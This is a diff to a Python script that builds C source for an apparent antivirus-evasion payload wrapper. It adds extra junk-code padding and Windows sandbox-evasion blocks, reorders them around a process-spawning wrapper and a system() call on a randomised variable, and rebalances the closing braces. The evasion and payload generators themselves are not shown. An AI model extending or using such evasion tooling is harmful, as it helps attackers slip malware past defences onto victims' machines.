@@ -54,13 +54,18 @@ Junkcode_17 = Junkmathinject()
 Junkcode_18 = Junkmathinject()
 Junkcode_19 = Junkmathinject()
 Junkcode_20 = Junkmathinject()
-
+Junkcode_21 = Junkmathinject()
+Junkcode_22 = Junkmathinject()
 
 WinEvasion_01 = windows_evasion()
 WinEvasion_02 = windows_evasion()
 WinEvasion_03 = windows_evasion()
 WinEvasion_04 = windows_evasion()
 WinEvasion_05 = windows_evasion()
+WinEvasion_06 = windows_evasion()
+WinEvasion_07 = windows_evasion()
+WinEvasion_08 = windows_evasion()
+WinEvasion_09 = windows_evasion()
  
 Hollow_code = ""
 
@@ -74,15 +79,19 @@ for i in range(0,len(Include_List)-1):
 
 Hollow_code += "int main(int argc,char * argv[]){\n"
 Hollow_code += Junkcode_01
-Hollow_code += WinEvasion_01
 Hollow_code += Junkcode_02
-Hollow_code += WinEvasion_02
 Hollow_code += Junkcode_03
+Hollow_code += WinEvasion_01
+Hollow_code += WinEvasion_02
 Hollow_code += WinEvasion_03
-Hollow_code += Junkcode_04
 Hollow_code += WinEvasion_04
-Hollow_code += Junkcode_05
+Hollow_code += Junkcode_04
 Hollow_code += WinEvasion_05
+Hollow_code += WinEvasion_06
+Hollow_code += Junkcode_05
+Hollow_code += WinEvasion_07
+Hollow_code += WinEvasion_08
+Hollow_code += WinEvasion_09
 Hollow_code += spawn_multiple_process(SpawnMultiProc)
 Hollow_code += Junkcode_06
 Hollow_code += Junkcode_07
@@ -97,11 +106,13 @@ Hollow_code += Junkcode_14
 Hollow_code += Junkcode_15
 Hollow_code += "system(" + Randvarname + ");\n"
 Hollow_code += close_brackets_multiproc(SpawnMultiProc)
-Hollow_code += "}}" + Junkcode_16 + "\n"
+Hollow_code += "}}}" + Junkcode_16 + "\n"
 Hollow_code += "}else{" + Junkcode_17 + "}\n"
 Hollow_code += "}else{" + Junkcode_18 + "}\n"
 Hollow_code += "}else{" + Junkcode_19 + "}\n"
-Hollow_code += Junkcode_20
+Hollow_code += "}else{" + Junkcode_20 + "}\n"
+Hollow_code += "}else{" + Junkcode_21 + "}\n"
+Hollow_code += "}else{" + Junkcode_22 + "}\n"
 Hollow_code += "return 0;}"
 Hollow_code = Hollow_code.encode('utf-8')
 
